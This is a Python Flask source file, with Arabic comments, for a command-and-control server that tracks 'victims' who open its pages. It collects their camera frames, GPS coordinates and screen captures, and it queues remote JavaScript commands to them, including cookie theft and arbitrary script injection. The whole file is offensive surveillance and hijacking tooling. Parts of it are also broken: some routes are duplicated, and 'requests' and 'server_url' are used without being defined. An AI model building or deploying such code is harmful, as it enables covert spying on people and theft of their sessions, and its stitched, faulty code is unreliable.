from flask import Flask, request, jsonify, render_template
import os
import uuid
from datetime import datetime, timedelta
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'  # Change this in production
socketio = SocketIO(app)

victims = {}
geo_data = {}
screen_frames = {}
commands = {}  # Store commands to be executed by victims
command_responses = {}  # Store responses from victims

# لتخزين آخر وقت تواصل لكل ضحية
last_seen = {}

def update_last_seen(victim_id):
    last_seen[victim_id] = datetime.utcnow()

# صفحة البداية لتسجيل الضحية
@app.route("/")
def index():
    victim_id = str(uuid.uuid4())
    victims[victim_id] = {}
    update_last_seen(victim_id)
    return render_template("index.html", victim_id=victim_id)

# صفحة الكاميرا
@app.route("/camera.html")
def camera_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("camera.html", victim_id=victim_id)

# صفحة تحديد الموقع
@app.route("/geo.html")
def geo_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("geo.html", victim_id=victim_id)

# صفحة مشاركة الشاشة
@app.route("/screenshare.html")
def screenshare_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("screenshare.html", victim_id=victim_id)

# استقبال صور الكاميرا
@app.route("/api/camera_frame", methods=["POST"])
def api_camera_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)

    frame = request.data
    if not os.path.exists("camera"):
        os.makedirs("camera")

    file_path = os.path.join("camera", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    print(f"[CAMERA] Frame saved for Victim {victim_id}")
    socketio.emit('camera_update', {'victim_id': victim_id}, namespace='/admin')
    return jsonify({"status": "ok"})

# استقبال بيانات الموقع
@app.route("/api/geo", methods=["POST"])
def api_geo():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)

    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")

    geo_data[victim_id] = {"lat": lat, "lon": lon}
    print(f"[GEO] Victim {victim_id} => Lat: {lat}, Lon: {lon}")
    socketio.emit('geo_update', {'victim_id': victim_id, 'lat': lat, 'lon': lon}, namespace='/admin')

    return jsonify({"status": "ok"})

# استقبال لقطات الشاشة
@app.route("/api/screen_frame", methods=["POST"])
def api_screen_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)

    frame = request.data
    if not os.path.exists("screens"):
        os.makedirs("screens")

    file_path = os.path.join("screens", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    screen_frames[victim_id] = file_path
    print(f"[SCREEN] Frame saved for Victim {victim_id}")
    socketio.emit('screen_update', {'victim_id': victim_id}, namespace='/admin')

    return jsonify({"status": "ok"})

# عرض الضحايا وحالتهم
@app.route("/api/victims", methods=["GET"])
def api_victims():
    result = []
    now = datetime.utcnow()

    for victim_id in victims.keys():
        seen = last_seen.get(victim_id)
        status = "Offline"
        last_seen_str = None
        if seen:
            diff = now - seen
            if diff < timedelta(minutes=5):  # يعتبر Online إذا تواصل خلال 5 دقائق
                status = "Online"
            last_seen_str = seen.strftime("%Y-%m-%d %H:%M:%S UTC")

        result.append({
            "id": victim_id,
            "status": status,
            "last_seen": last_seen_str
        })

    return jsonify(result)

# WebSocket handlers
@socketio.on('connect', namespace='/victim')
def handle_victim_connect():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return False
    
    print(f"Victim connected via WebSocket: {victim_id}")
    update_last_seen(victim_id)
    
    # Check if there are pending commands
    if victim_id in commands and commands[victim_id]:
        emit('execute_command', commands[victim_id].pop(0))

@socketio.on('command_response', namespace='/victim')
def handle_command_response(data):
    victim_id = data.get('victim_id')
    command_id = data.get('command_id')
    response = data.get('response')
    
    if victim_id and command_id:
        if victim_id not in command_responses:
            command_responses[victim_id] = {}
        command_responses[victim_id][command_id] = response
        print(f"Received response from victim {victim_id} for command {command_id}")
        
        # Notify admin
        emit('command_response', data, namespace='/admin', broadcast=True)

@socketio.on('connect', namespace='/admin')
def handle_admin_connect():
    print("Admin dashboard connected via WebSocket")

# مسار تنفيذ أوامر JS على الضحية (WebSocket أو Polling)
@app.route("/api/execute", methods=["POST"])
def api_execute():
    data = request.get_json()
    victim_id = data.get("victim_id")
    command = data.get("command")
    source = data.get("source")
    command_id = str(uuid.uuid4())  # Generate unique ID for this command

    if not victim_id or victim_id not in victims:
        return jsonify({"error": "Victim not found"}), 404

    print(f"[EXECUTE] Victim: {victim_id} | Command: {command} | Source: {source}")
    update_last_seen(victim_id)

    # Prepare command data
    command_data = {
        'command_id': command_id,
        'command': command,
        'source': source
    }

    # Store the command (for polling)
    if victim_id not in commands:
        commands[victim_id] = []
    commands[victim_id].append(command_data)

    # Send via WebSocket if available
    socketio.emit('execute_command', command_data, namespace='/victim')

    return jsonify({
        "status": "Command sent",
        "command_id": command_id,
        "method": "websocket"  # or "polling" if WebSocket not available
    })

# Polling endpoint for victims to check for commands
@app.route("/api/poll_commands", methods=["GET"])
def poll_commands():
    victim_id = request.args.get("victim_id")
    if not victim_id or victim_id not in victims:
        return jsonify({"error": "Victim not found"}), 404

    update_last_seen(victim_id)

    if victim_id in commands and commands[victim_id]:
        return jsonify({"command": commands[victim_id].pop(0)})
    return jsonify({"command": None})

# Polling endpoint to check command response
@app.route("/api/command_response", methods=["GET"])
def get_command_response():
    command_id = request.args.get("command_id")
    victim_id = request.args.get("victim_id")
    
    if not command_id or not victim_id:
        return jsonify({"error": "Missing parameters"}), 400
    
    if victim_id in command_responses and command_id in command_responses[victim_id]:
        response = command_responses[victim_id].pop(command_id)
        return jsonify({"response": response})
    
    return jsonify({"response": None})

# أضف هذه الدوال إلى app.py

@app.route("/api/send_command_v2", methods=["POST"])
def api_send_command():
    data = request.get_json()
    victim_id = data.get("victim_id")
    command = data.get("command")
    
    if not victim_id or not command:
        return jsonify({"error": "Victim ID and command are required"}), 400
    
    if victim_id not in commands:
        commands[victim_id] = []
    
    command_id = str(uuid.uuid4())
    commands[victim_id].append({
        "command_id": command_id,
        "command": command,
        "status": "pending",
        "timestamp": datetime.utcnow().isoformat()
    })
    
    return jsonify({
        "status": "command_queued",
        "command_id": command_id
    })

@app.route("/api/get_commands", methods=["GET"])
def api_get_commands():
    victim_id = request.args.get("victim_id")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400
    
    pending_commands = commands.get(victim_id, [])
    return jsonify({"commands": pending_commands})
# أضف هذه الدوال إلى app.py

@app.route("/api/send_command", methods=["POST"])
def api_send_command():
    data = request.get_json()
    victim_id = data.get("victim_id")
    command = data.get("command")
    
    if not victim_id or not command:
        return jsonify({"error": "Victim ID and command are required"}), 400
    
    if victim_id not in commands:
        commands[victim_id] = []
    
    command_id = str(uuid.uuid4())
    commands[victim_id].append({
        "command_id": command_id,
        "command": command,
        "status": "pending",
        "timestamp": datetime.utcnow().isoformat()
    })
    
    return jsonify({
        "status": "command_queued",
        "command_id": command_id
    })

@app.route("/api/get_commands", methods=["GET"])
def api_get_commands():
    victim_id = request.args.get("victim_id")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400
    
    pending_commands = commands.get(victim_id, [])
    return jsonify({"commands": pending_commands})

@app.route("/capture_screenshot", methods=["POST"])
def capture_screenshot():
    victim_id = request.args.get("victim_id")
    response = requests.post(
        f"{server_url}/api/send_command",
        json={
            "victim_id": victim_id,
            "command": "screenshot"
        }
    )
    return response.json()

@app.route("/get_cookies", methods=["GET"])
def get_cookies():
    victim_id = request.args.get("victim_id")
    response = requests.post(
        f"{server_url}/api/send_command",
        json={
            "victim_id": victim_id,
            "command": "get_cookies"
        }
    )
    return response.json()

@app.route("/inject_js", methods=["POST"])
def inject_js():
    victim_id = request.args.get("victim_id")
    js_code = request.json.get("code")
    
    response = requests.post(
        f"{server_url}/api/send_command",
        json={
            "victim_id": victim_id,
            "command": "inject_js",
            "params": {
                "code": js_code
            }
        }
    )
    return response.json()



if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000, debug=True)
